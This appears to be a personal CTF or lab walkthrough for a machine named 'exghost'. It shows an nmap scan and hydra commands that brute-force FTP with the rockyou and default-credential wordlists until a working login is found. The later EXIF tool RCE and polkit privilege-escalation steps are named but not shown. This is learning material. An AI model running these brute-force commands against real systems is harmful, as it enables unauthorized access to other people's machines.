exghost


Cve 2021 22204 and a github

50911


192.168.63.183

## overview

1. ftp brute force
2. analyze pcap
3. rce with EXIF tool
4. privesc by "exploiting a vulnerable version of the policykit-1 package"

cool, lets get crackin


```
???(kali?kali)-[~]
??$ nmap -sS -sV 192.168.63.183                                            
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-06 20:23 +0000
Nmap scan report for 192.168.63.183
Host is up (0.00075s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 3.0.3
80/tcp open   http     Apache httpd 2.4.41
Service Info: Host: 127.0.0.1; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.93 seconds
                                                                                                          
```

https://github.com/danielmiessler/SecLists/tree/master

```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.63.183 ftp
```

oh, neat, port 80 and ftp are open.
http://192.168.63.183/

web server. let's dirb

http://192.168.63.183/server-status - 403, boo

let's use top 100 unix_password.txt - with `head -100 FILE`.

okay nope.

I need to use rockyou.txt

```

hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 192.168.63.183 ftp

# over 30 minutes, nothing yet :(
```


useful command to find permissions:

    find / -writable -type d 2>/dev/null | grep '/proc' | grep -v "/sys"

okay. according to a medium article, `@0xrave`, author, we can use `-C` option.


    hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.63.183:21

`user:system` is our cred. whew that took way too long.